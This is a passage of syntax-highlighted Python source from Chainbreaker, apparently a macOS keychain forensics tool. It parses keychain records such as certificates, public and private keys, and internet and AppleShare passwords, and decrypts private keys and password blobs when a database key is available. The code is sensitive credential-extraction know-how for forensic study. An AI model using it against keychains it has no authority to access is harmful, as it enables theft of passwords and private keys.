</span></span><span style="display:flex;"><span>        buffer <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>kc_buffer[base_addr <span style="color:#f92672">+</span> _APPLE_SHARE_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size:base_addr <span style="color:#f92672">+</span> record_meta<span style="color:#f92672">.</span>RecordSize]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ssgp, dbkey <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_extract_ssgp_and_dbkey(record_meta, buffer)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>AppleshareRecord(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            created<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_keychain_time(base_addr, record_meta<span style="color:#f92672">.</span>CreationDate <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            last_modified<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_keychain_time(base_addr, record_meta<span style="color:#f92672">.</span>ModDate <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Description <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            comment<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Comment <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            creator<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_four_char_code(base_addr, record_meta<span style="color:#f92672">.</span>Creator <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            type<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_four_char_code(base_addr, record_meta<span style="color:#f92672">.</span>Type <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            print_name<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            alias<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Alias <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            protected<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Protected <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            account<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Account <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            volume<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Volume <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            server<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Server <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            protocol_type<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_four_char_code(base_addr, record_meta<span style="color:#f92672">.</span>Protocol <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            address<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Address <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            signature<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Signature <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ssgp<span style="color:#f92672">=</span>ssgp,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            dbkey<span style="color:#f92672">=</span>dbkey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_private_key_record</span>(self, record_offset):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_key_record(self<span style="color:#f92672">.</span>_get_table_offset(CSSM_DL_DB_RECORD_PRIVATE_KEY), record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> self<span style="color:#f92672">.</span>db_key:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            keyname <span style="color:#f92672">=</span> privatekey <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>KEYCHAIN_LOCKED_SIGNATURE
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            keyname, privatekey <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_private_key_decryption(record[<span style="color:#ae81ff">10</span>], record[<span style="color:#ae81ff">9</span>])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>PrivateKeyRecord(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            print_name<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">0</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            label<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">1</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            key_class<span style="color:#f92672">=</span>KEY_TYPE[record[<span style="color:#ae81ff">2</span>]],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            private<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">3</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            key_type<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">4</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            key_size<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">5</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            effective_key_size<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">6</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            extracted<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">7</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            cssm_type<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">8</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            iv<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">9</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            key<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">10</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            key_name<span style="color:#f92672">=</span>keyname,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            private_key<span style="color:#f92672">=</span>privatekey,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_public_key_record</span>(self, record_offset):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_key_record(self<span style="color:#f92672">.</span>_get_table_offset(CSSM_DL_DB_RECORD_PUBLIC_KEY), record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>PublicKeyRecord(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            print_name<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">0</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            label<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">1</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            key_class<span style="color:#f92672">=</span>KEY_TYPE[record[<span style="color:#ae81ff">2</span>]],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            private<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">3</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            key_type<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">4</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            key_size<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">5</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            effective_key_size<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">6</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            extracted<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">7</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            cssm_type<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">8</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            iv<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">9</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            public_key<span style="color:#f92672">=</span>record[<span style="color:#ae81ff">10</span>],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_key_record</span>(self, table_name, record_offset):  <span style="color:#75715e">## PUBLIC and PRIVATE KEY</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        base_addr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_base_address(table_name, record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record_meta <span style="color:#f92672">=</span> _SECKEY_HEADER(self<span style="color:#f92672">.</span>kc_buffer[base_addr:base_addr <span style="color:#f92672">+</span> _SECKEY_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        key_blob <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>kc_buffer[
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                   base_addr <span style="color:#f92672">+</span> _SECKEY_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size:base_addr <span style="color:#f92672">+</span> _SECKEY_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size <span style="color:#f92672">+</span> record_meta<span style="color:#f92672">.</span>BlobSize]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        iv, key <span style="color:#f92672">=</span> Chainbreaker<span style="color:#f92672">.</span>_get_encrypted_data_in_blob(key_blob)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> [self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Label <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>KeyClass <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>Private <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                CSSM_ALGORITHMS[self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>KeyType <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>)],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>KeySizeInBits <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>EffectiveKeySize <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>Extractable <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                STD_APPLE_ADDIN_MODULE[
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                    str(self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>KeyCreator <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>))<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>)[<span style="color:#ae81ff">0</span>]],
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                iv,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                key]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_x_509_record</span>(self, record_offset):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        base_addr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_base_address(CSSM_DL_DB_RECORD_X509_CERTIFICATE, record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record_meta <span style="color:#f92672">=</span> _X509_CERT_HEADER(self<span style="color:#f92672">.</span>kc_buffer[base_addr:base_addr <span style="color:#f92672">+</span> _X509_CERT_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>X509CertificateRecord(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            type<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>CertType <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            encoding<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>CertEncoding <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            print_name<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            alias<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Alias <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            subject<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Subject <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            issuer<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Issuer <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            serial_number<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>SerialNumber <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            subject_key_identifier<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>SubjectKeyIdentifier <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            public_key_hash<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>PublicKeyHash <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            certificate<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>kc_buffer[
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                        base_addr <span style="color:#f92672">+</span> _X509_CERT_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size:base_addr <span style="color:#f92672">+</span> _X509_CERT_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size <span style="color:#f92672">+</span> record_meta<span style="color:#f92672">.</span>CertSize]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_extract_ssgp_and_dbkey</span>(self, record_meta, buffer):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ssgp <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        dbkey <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> record_meta<span style="color:#f92672">.</span>SSGPArea <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ssgp <span style="color:#f92672">=</span> _SSGP(buffer[:record_meta<span style="color:#f92672">.</span>SSGPArea])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            dbkey_index <span style="color:#f92672">=</span> ssgp<span style="color:#f92672">.</span>Magic <span style="color:#f92672">+</span> ssgp<span style="color:#f92672">.</span>Label
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> dbkey_index <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>key_list:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                dbkey <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>key_list[dbkey_index]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ssgp, dbkey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_internet_password_record</span>(self, record_offset):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        base_addr <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_get_base_address(CSSM_DL_DB_RECORD_INTERNET_PASSWORD, record_offset)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        record_meta <span style="color:#f92672">=</span> _INTERNET_PW_HEADER(self<span style="color:#f92672">.</span>kc_buffer[base_addr:base_addr <span style="color:#f92672">+</span> _INTERNET_PW_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        buffer <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>kc_buffer[base_addr <span style="color:#f92672">+</span> _INTERNET_PW_HEADER<span style="color:#f92672">.</span>STRUCT<span style="color:#f92672">.</span>size:base_addr <span style="color:#f92672">+</span> record_meta<span style="color:#f92672">.</span>RecordSize]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        ssgp, dbkey <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_extract_ssgp_and_dbkey(record_meta, buffer)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> self<span style="color:#f92672">.</span>InternetPasswordRecord(
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            created<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_keychain_time(base_addr, record_meta<span style="color:#f92672">.</span>CreationDate <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            last_modified<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_keychain_time(base_addr, record_meta<span style="color:#f92672">.</span>ModDate <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            description<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Description <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            comment<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Comment <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            creator<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_four_char_code(base_addr, record_meta<span style="color:#f92672">.</span>Creator <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            type<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_four_char_code(base_addr, record_meta<span style="color:#f92672">.</span>Type <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            print_name<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>PrintName <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            alias<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Alias <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            protected<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Protected <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            account<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Account <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            security_domain<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>SecurityDomain <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            server<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Server <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            protocol_type<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_four_char_code(base_addr, record_meta<span style="color:#f92672">.</span>Protocol <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            auth_type<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>AuthType <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            port<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_int(base_addr, record_meta<span style="color:#f92672">.</span>Port <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            path<span style="color:#f92672">=</span>self<span style="color:#f92672">.</span>_get_lv(base_addr, record_meta<span style="color:#f92672">.</span>Path <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFFFFFFFE</span>),
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            ssgp<span style="color:#f92672">=</span>ssgp,
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            dbkey<span style="color:#f92672">=</span>dbkey
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">_get_generic_password_record</span>(self, record_offset):
</span></span><span style="display:flex;"><span>
